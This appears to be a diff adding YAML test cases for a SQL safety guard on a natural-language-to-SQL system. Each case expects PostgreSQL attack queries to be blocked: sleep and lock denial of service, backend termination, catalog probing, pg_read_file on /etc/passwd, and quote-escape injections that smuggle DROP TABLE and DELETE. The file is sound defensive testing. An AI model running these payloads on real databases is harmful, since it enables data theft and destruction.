+- id: sleep_locks_resources-004
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT pg_sleep_for('5 seconds')
+- id: sleep_locks_resources-005
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT pg_sleep_until(now() + interval '5 seconds')
+- id: sleep_locks_resources-006
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT * FROM pg_sleep(5)
+- id: sleep_locks_resources-007
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT 1 WHERE pg_sleep(5) IS NULL
+- id: sleep_locks_resources-008
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT * FROM orders ORDER BY (SELECT pg_sleep(1))
+- id: sleep_locks_resources-009
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT CASE WHEN true THEN pg_sleep(1) END
+- id: sleep_locks_resources-010
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT * FROM orders o JOIN LATERAL (SELECT pg_sleep(1)) s ON true
+- id: sleep_locks_resources-011
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT count(*) FROM orders HAVING pg_sleep(1) IS NOT NULL
+- id: sleep_locks_resources-012
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT pg_advisory_lock(1)
+- id: sleep_locks_resources-013
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT pg_advisory_lock(1, 2)
+- id: sleep_locks_resources-014
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT pg_advisory_lock_shared(1)
+- id: sleep_locks_resources-015
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT pg_advisory_xact_lock(1)
+- id: sleep_locks_resources-016
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT pg_advisory_xact_lock_shared(1)
+- id: sleep_locks_resources-017
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT pg_try_advisory_lock(1)
+- id: sleep_locks_resources-018
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT pg_try_advisory_xact_lock(1)
+- id: sleep_locks_resources-019
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT pg_advisory_unlock(1)
+- id: sleep_locks_resources-020
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT pg_advisory_unlock_all()
+- id: sleep_locks_resources-021
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT * FROM generate_series(1, 100000000000)
+- id: sleep_locks_resources-022
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT count(*) FROM generate_series(1, 1e11)
+- id: sleep_locks_resources-023
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT count(*) FROM generate_series(1, 1000000000) a
+- id: sleep_locks_resources-024
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT count(*) FROM generate_series(1, 100000) a, generate_series(1, 100000) b
+- id: sleep_locks_resources-025
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT count(*) FROM generate_series(1, 100000) a CROSS JOIN generate_series(1, 100000) b
+- id: sleep_locks_resources-026
+  category: sleep_locks_resources
+  expect: block
+  sql: SELECT * FROM generate_series(1, 1e10) WITH ORDINALITY
+- id: backend_control-001
+  category: backend_control
+  expect: block
+  sql: SELECT pg_terminate_backend(999999)
+- id: backend_control-002
+  category: backend_control
+  expect: block
+  sql: SELECT pg_cancel_backend(999999)
+- id: backend_control-003
+  category: backend_control
+  expect: block
+  sql: SELECT pg_reload_conf()
+- id: backend_control-004
+  category: backend_control
+  expect: block
+  sql: SELECT pg_rotate_logfile()
+- id: backend_control-005
+  category: backend_control
+  expect: block
+  sql: SELECT pg_switch_wal()
+- id: backend_control-006
+  category: backend_control
+  expect: block
+  sql: SELECT pg_create_restore_point('x')
+- id: backend_control-007
+  category: backend_control
+  expect: block
+  sql: SELECT pg_promote()
+- id: backend_control-008
+  category: backend_control
+  expect: block
+  sql: SELECT pg_backup_start('x')
+- id: backend_control-009
+  category: backend_control
+  expect: block
+  sql: SELECT pg_backup_stop()
+- id: backend_control-010
+  category: backend_control
+  expect: block
+  sql: SELECT pg_wal_replay_pause()
+- id: backend_control-011
+  category: backend_control
+  expect: block
+  sql: SELECT pg_stat_reset()
+- id: backend_control-012
+  category: backend_control
+  expect: block
+  sql: SELECT pg_stat_reset_shared('bgwriter')
+- id: backend_control-013
+  category: backend_control
+  expect: block
+  sql: SELECT pg_stat_statements_reset()
+- id: backend_control-014
+  category: backend_control
+  expect: block
+  sql: SELECT pg_log_backend_memory_contexts(999999)
+- id: backend_control-015
+  category: backend_control
+  expect: block
+  sql: SELECT pg_create_logical_replication_slot('s', 'test_decoding')
+- id: backend_control-016
+  category: backend_control
+  expect: block
+  sql: SELECT pg_drop_replication_slot('redteam_no_such_slot')
+- id: backend_control-017
+  category: backend_control
+  expect: block
+  sql: SELECT pg_replication_origin_create('redteam_no_such_origin')
+- id: backend_control-018
+  category: backend_control
+  expect: block
+  sql: SELECT pg_notify('chan', 'payload')
+- id: backend_control-019
+  category: backend_control
+  expect: block
+  sql: SELECT pg_logical_emit_message(true, 'p', 'm')
+- id: backend_control-020
+  category: backend_control
+  expect: block
+  sql: SELECT pg_terminate_backend(pid) FROM pg_stat_activity WHERE pid = 999999
+- id: backend_control-021
+  category: backend_control
+  expect: block
+  sql: SELECT copy_file_range(1)
+- id: catalog_probing-001
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM pg_catalog.pg_roles
+- id: catalog_probing-002
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM pg_roles
+- id: catalog_probing-003
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM pg_shadow
+- id: catalog_probing-004
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM pg_authid
+- id: catalog_probing-005
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM pg_user
+- id: catalog_probing-006
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM pg_stat_activity
+- id: catalog_probing-007
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM pg_database
+- id: catalog_probing-008
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM pg_tables
+- id: catalog_probing-009
+  category: catalog_probing
+  expect: block
+  sql: SELECT relname FROM pg_class
+- id: catalog_probing-010
+  category: catalog_probing
+  expect: block
+  sql: SELECT nspname FROM pg_namespace
+- id: catalog_probing-011
+  category: catalog_probing
+  expect: block
+  sql: SELECT proname FROM pg_proc
+- id: catalog_probing-012
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM pg_extension
+- id: catalog_probing-013
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM information_schema.tables
+- id: catalog_probing-014
+  category: catalog_probing
+  expect: block
+  sql: SELECT column_name FROM information_schema.columns WHERE table_name = 'customers'
+- id: catalog_probing-015
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM information_schema.routines
+- id: catalog_probing-016
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM information_schema.table_privileges
+- id: catalog_probing-017
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM information_schema.schemata
+- id: catalog_probing-018
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM "pg_catalog"."pg_roles"
+- id: catalog_probing-019
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM pg_catalog."pg_roles"
+- id: catalog_probing-020
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM "pg_roles"
+- id: catalog_probing-021
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM PG_CATALOG.PG_ROLES
+- id: catalog_probing-022
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM Pg_Catalog.Pg_Roles
+- id: catalog_probing-023
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM "Information_Schema"."Tables"
+- id: catalog_probing-024
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM INFORMATION_SCHEMA.COLUMNS
+- id: catalog_probing-025
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM nl2sql_assignment.pg_catalog.pg_roles
+- id: catalog_probing-026
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM nl2sql_assignment.information_schema.tables
+- id: catalog_probing-027
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM orders o, pg_class c
+- id: catalog_probing-028
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM orders WHERE EXISTS (SELECT 1 FROM pg_catalog.pg_roles)
+- id: catalog_probing-029
+  category: catalog_probing
+  expect: block
+  sql: WITH x AS (SELECT * FROM pg_catalog.pg_authid) SELECT * FROM x
+- id: catalog_probing-030
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM (SELECT rolname FROM pg_roles) q
+- id: catalog_probing-031
+  category: catalog_probing
+  expect: block
+  sql: SELECT rolname FROM pg_roles UNION SELECT name FROM customers
+- id: catalog_probing-032
+  category: catalog_probing
+  expect: block
+  sql: SELECT name FROM customers UNION ALL SELECT usename FROM pg_user
+- id: catalog_probing-033
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM pg_toast.pg_toast_1255
+- id: catalog_probing-034
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM pg_temp.foo
+- id: catalog_probing-035
+  category: catalog_probing
+  expect: block
+  sql: SELECT 'pg_roles'::regclass
+- id: catalog_probing-036
+  category: catalog_probing
+  expect: block
+  sql: SELECT 'pg_authid'::regclass::oid
+- id: catalog_probing-037
+  category: catalog_probing
+  expect: block
+  sql: SELECT 'pg_proc'::regclass
+- id: catalog_probing-038
+  category: catalog_probing
+  expect: block
+  sql: SELECT 'pg_sleep'::regproc
+- id: catalog_probing-039
+  category: catalog_probing
+  expect: block
+  sql: SELECT 'pg_sleep(interval)'::regprocedure
+- id: catalog_probing-040
+  category: catalog_probing
+  expect: block
+  sql: SELECT to_regclass('pg_roles')
+- id: catalog_probing-041
+  category: catalog_probing
+  expect: block
+  sql: SELECT pg_get_viewdef('pg_roles'::regclass)
+- id: catalog_probing-042
+  category: catalog_probing
+  expect: block
+  sql: SELECT pg_get_functiondef('pg_sleep'::regproc)
+- id: catalog_probing-043
+  category: catalog_probing
+  expect: block
+  sql: SELECT pg_get_userbyid(10)
+- id: catalog_probing-044
+  category: catalog_probing
+  expect: block
+  sql: SELECT has_table_privilege('orders', 'insert')
+- id: catalog_probing-045
+  category: catalog_probing
+  expect: block
+  sql: SELECT has_database_privilege('nl2sql_assignment', 'create')
+- id: catalog_probing-046
+  category: catalog_probing
+  expect: block
+  sql: SELECT current_schemas(true)
+- id: catalog_probing-047
+  category: catalog_probing
+  expect: block
+  sql: SELECT obj_description('orders'::regclass)
+- id: catalog_probing-048
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM pg_get_keywords()
+- id: catalog_probing-049
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM pg_stat_get_activity(NULL)
+- id: catalog_probing-050
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM information_schema._pg_expandarray(ARRAY[1,2])
+- id: catalog_probing-051
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM pg_index
+- id: catalog_probing-052
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM pg_stat_user_tables
+- id: catalog_probing-053
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM pg_locks
+- id: catalog_probing-054
+  category: catalog_probing
+  expect: block
+  sql: SELECT * FROM pg_stat_replication
+- id: sequences_txid-001
+  category: sequences_txid
+  expect: block
+  sql: SELECT nextval('customers_customer_id_seq')
+- id: sequences_txid-002
+  category: sequences_txid
+  expect: block
+  sql: SELECT nextval('orders_order_id_seq'::regclass)
+- id: sequences_txid-003
+  category: sequences_txid
+  expect: block
+  sql: SELECT setval('customers_customer_id_seq', 1000000)
+- id: sequences_txid-004
+  category: sequences_txid
+  expect: block
+  sql: SELECT setval('orders_order_id_seq', 1, false)
+- id: sequences_txid-005
+  category: sequences_txid
+  expect: block
+  sql: SELECT currval('customers_customer_id_seq')
+- id: sequences_txid-006
+  category: sequences_txid
+  expect: block
+  sql: SELECT lastval()
+- id: sequences_txid-007
+  category: sequences_txid
+  expect: block
+  sql: SELECT txid_current()
+- id: sequences_txid-008
+  category: sequences_txid
+  expect: block
+  sql: SELECT txid_current_if_assigned()
+- id: sequences_txid-009
+  category: sequences_txid
+  expect: block
+  sql: SELECT txid_current_snapshot()
+- id: sequences_txid-010
+  category: sequences_txid
+  expect: block
+  sql: SELECT txid_status(1)
+- id: sequences_txid-011
+  category: sequences_txid
+  expect: block
+  sql: SELECT pg_current_xact_id()
+- id: sequences_txid-012
+  category: sequences_txid
+  expect: block
+  sql: SELECT pg_current_snapshot()
+- id: sequences_txid-013
+  category: sequences_txid
+  expect: block
+  sql: SELECT pg_current_wal_lsn()
+- id: sequences_txid-014
+  category: sequences_txid
+  expect: block
+  sql: SELECT pg_export_snapshot()
+- id: sequences_txid-015
+  category: sequences_txid
+  expect: block
+  sql: SELECT pg_xact_commit_timestamp('1'::xid)
+- id: sequences_txid-016
+  category: sequences_txid
+  expect: block
+  sql: SELECT pg_snapshot_xmin(pg_current_snapshot())
+- id: sequences_txid-017
+  category: sequences_txid
+  expect: block
+  sql: SELECT nextval('x') FROM generate_series(1, 5)
+- id: sequences_txid-018
+  category: sequences_txid
+  expect: block
+  sql: SELECT * FROM orders WHERE order_id = nextval('orders_order_id_seq')
+- id: info_disclosure-001
+  category: info_disclosure
+  expect: block
+  sql: SELECT version()
+- id: info_disclosure-002
+  category: info_disclosure
+  expect: block
+  sql: SELECT VERSION()
+- id: info_disclosure-003
+  category: info_disclosure
+  expect: block
+  sql: SELECT pg_catalog.version()
+- id: info_disclosure-004
+  category: info_disclosure
+  expect: block
+  sql: SELECT inet_server_addr()
+- id: info_disclosure-005
+  category: info_disclosure
+  expect: block
+  sql: SELECT inet_server_port()
+- id: info_disclosure-006
+  category: info_disclosure
+  expect: block
+  sql: SELECT inet_client_addr()
+- id: info_disclosure-007
+  category: info_disclosure
+  expect: block
+  sql: SELECT inet_client_port()
+- id: info_disclosure-008
+  category: info_disclosure
+  expect: block
+  sql: SELECT current_user
+- id: info_disclosure-009
+  category: info_disclosure
+  expect: block
+  sql: SELECT session_user
+- id: info_disclosure-010
+  category: info_disclosure
+  expect: block
+  sql: SELECT user
+- id: info_disclosure-011
+  category: info_disclosure
+  expect: block
+  sql: SELECT current_role
+- id: info_disclosure-012
+  category: info_disclosure
+  expect: block
+  sql: SELECT current_database()
+- id: info_disclosure-013
+  category: info_disclosure
+  expect: block
+  sql: SELECT current_catalog
+- id: info_disclosure-014
+  category: info_disclosure
+  expect: block
+  sql: SELECT current_schema
+- id: info_disclosure-015
+  category: info_disclosure
+  expect: block
+  sql: SELECT current_schema()
+- id: info_disclosure-016
+  category: info_disclosure
+  expect: block
+  sql: SELECT pg_backend_pid()
+- id: info_disclosure-017
+  category: info_disclosure
+  expect: block
+  sql: SELECT pg_postmaster_start_time()
+- id: info_disclosure-018
+  category: info_disclosure
+  expect: block
+  sql: SELECT pg_conf_load_time()
+- id: info_disclosure-019
+  category: info_disclosure
+  expect: block
+  sql: SELECT pg_is_in_recovery()
+- id: info_disclosure-020
+  category: info_disclosure
+  expect: block
+  sql: SELECT pg_database_size('nl2sql_assignment')
+- id: info_disclosure-021
+  category: info_disclosure
+  expect: block
+  sql: SELECT pg_size_pretty(pg_database_size(current_database()))
+- id: info_disclosure-022
+  category: info_disclosure
+  expect: block
+  sql: SELECT pg_tablespace_location(0)
+- id: info_disclosure-023
+  category: info_disclosure
+  expect: block
+  sql: SELECT pg_my_temp_schema()
+- id: info_disclosure-024
+  category: info_disclosure
+  expect: block
+  sql: SELECT current_query()
+- id: info_disclosure-025
+  category: info_disclosure
+  expect: block
+  sql: SELECT name, current_user FROM customers
+- id: info_disclosure-026
+  category: info_disclosure
+  expect: block
+  sql: SELECT * FROM customers WHERE name = current_user
+- id: info_disclosure-027
+  category: info_disclosure
+  expect: block
+  sql: SELECT pg_total_relation_size('orders')
+- id: info_disclosure-028
+  category: info_disclosure
+  expect: block
+  sql: SELECT pg_trigger_depth()
+- id: info_disclosure-029
+  category: info_disclosure
+  expect: block
+  sql: SELECT pg_get_serial_sequence('orders', 'order_id')
+- id: function_obfuscation-001
+  category: function_obfuscation
+  expect: block
+  sql: SeLeCt pG_sLeEp(5)
+- id: function_obfuscation-002
+  category: function_obfuscation
+  expect: block
+  sql: SELECT "pg_sleep"(5)
+- id: function_obfuscation-003
+  category: function_obfuscation
+  expect: block
+  sql: SELECT pg_catalog."pg_sleep"(5)
+- id: function_obfuscation-004
+  category: function_obfuscation
+  expect: block
+  sql: SELECT PG_CATALOG.PG_SLEEP(5)
+- id: function_obfuscation-005
+  category: function_obfuscation
+  expect: block
+  sql: SELECT public.pg_sleep(5)
+- id: function_obfuscation-006
+  category: function_obfuscation
+  expect: block
+  sql: SELECT myschema.my_func(1)
+- id: function_obfuscation-007
+  category: function_obfuscation
+  expect: block
+  sql: SELECT U&"pg_sl\0065ep"(5)
+- id: function_obfuscation-008
+  category: function_obfuscation
+  expect: block
+  sql: SELECT pg_sleep /* c */ (5)
+- id: function_obfuscation-009
+  category: function_obfuscation
+  expect: block
+  sql: "SELECT pg_sleep\n(5)"
+- id: function_obfuscation-010
+  category: function_obfuscation
+  expect: block
+  sql: SELECT "query_to_xml"('select 1', true, true, '')
+- id: function_obfuscation-011
+  category: function_obfuscation
+  expect: block
+  sql: SELECT "VERSION"()
+- id: function_obfuscation-012
+  category: function_obfuscation
+  expect: block
+  sql: SELECT "version"()
+- id: function_obfuscation-013
+  category: function_obfuscation
+  expect: block
+  sql: SELECT * FROM "pg_ls_dir"('.')
+- id: function_obfuscation-014
+  category: function_obfuscation
+  expect: block
+  sql: SELECT my_custom_udf(name) FROM customers
+- id: function_obfuscation-015
+  category: function_obfuscation
+  expect: block
+  sql: SELECT * FROM my_srf()
+- id: function_obfuscation-016
+  category: function_obfuscation
+  expect: block
+  sql: SELECT unknown_function()
+- id: function_obfuscation-017
+  category: function_obfuscation
+  expect: block
+  sql: SELECT pg_read_file(chr(47) || 'etc/passwd')
+- id: function_obfuscation-018
+  category: function_obfuscation
+  expect: block
+  sql: SELECT coalesce(pg_sleep(1)::text, 'x')
+- id: function_obfuscation-019
+  category: function_obfuscation
+  expect: block
+  sql: SELECT upper(version())
+- id: function_obfuscation-020
+  category: function_obfuscation
+  expect: block
+  sql: SELECT length(current_setting('data_directory'))
+- id: function_obfuscation-021
+  category: function_obfuscation
+  expect: block
+  sql: SELECT count(*) FILTER (WHERE pg_sleep(1) IS NULL) FROM orders
+- id: function_obfuscation-022
+  category: function_obfuscation
+  expect: block
+  sql: SELECT sum(1) OVER (ORDER BY pg_sleep(1)) FROM orders
+- id: function_obfuscation-023
+  category: function_obfuscation
+  expect: block
+  sql: SELECT * FROM orders WHERE order_id IN (SELECT lo_from_bytea(0, 'x')::int)
+- id: function_obfuscation-024
+  category: function_obfuscation
+  expect: block
+  sql: SELECT (SELECT version()) FROM customers
+- id: function_obfuscation-025
+  category: function_obfuscation
+  expect: block
+  sql: SELECT * FROM ROWS FROM (pg_sleep(1))
+- id: function_obfuscation-026
+  category: function_obfuscation
+  expect: block
+  sql: SELECT array_agg(pg_read_file(name)) FROM customers
+- id: function_obfuscation-027
+  category: function_obfuscation
+  expect: block
+  sql: SELECT 1 FROM orders GROUP BY pg_sleep(1)
+- id: function_obfuscation-028
+  category: function_obfuscation
+  expect: block
+  sql: SELECT * FROM customers ORDER BY length(version())
+- id: parser_differential-001
+  category: parser_differential
+  expect: block
+  sql: SELECT 'a\' || pg_sleep(5) || '...'
+- id: parser_differential-002
+  category: parser_differential
+  expect: block
+  sql: SELECT * FROM orders WHERE status = '\' OR pg_sleep(5) IS NULL --'
+- id: parser_differential-003
+  category: parser_differential
+  expect: block
+  sql: SELECT '\', query_to_xml('select * from pg_roles', true, true, ''), '\'
+- id: parser_differential-004
+  category: parser_differential
+  expect: block
+  sql: SELECT "a\" , pg_sleep(5) , "b\"
+- id: parser_differential-005
+  category: parser_differential
+  expect: block
+  sql: SELECT '\' || version() || '\'
+- id: parser_differential-006
+  category: parser_differential
+  expect: block
+  sql: SELECT '\', current_setting('data_directory'), '\'
+- id: parser_differential-007
+  category: parser_differential
+  expect: block
+  sql: SELECT '\' ; DROP TABLE orders ; --'
+- id: parser_differential-008
+  category: parser_differential
+  expect: block
+  sql: SELECT E'x' || pg_sleep(5)
+- id: parser_differential-009
+  category: parser_differential
+  expect: block
+  sql: SELECT $$x$$ || pg_sleep(5)
+- id: parser_differential-010
+  category: parser_differential
+  expect: block
+  sql: SELECT U&'x' || pg_sleep(5)
+- id: parser_differential-011
+  category: parser_differential
+  expect: block
+  sql: SELECT 1 /* /* */ */ ; /* */ DELETE FROM orders
